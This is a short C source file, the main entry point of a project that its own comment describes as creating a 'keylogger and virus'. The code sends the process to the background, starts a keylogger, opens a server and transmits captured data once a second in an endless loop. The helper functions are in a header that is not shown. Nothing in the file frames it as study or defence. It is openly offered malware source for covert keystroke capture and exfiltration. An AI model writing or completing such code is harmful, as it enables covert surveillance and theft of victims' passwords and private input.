/*
Main function to run to create keylogger and virus
*/
#include "client.h"
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
void main(void) {
  background_process();
  begin_keylogger();
  open_server();

  pid_t my_pid = getpid();
  while (1) {
    transmit_data();
    //printf("%d\n",(int)my_pid);
    sleep(1);
  }
  end_keylogger();
  close_server();
}
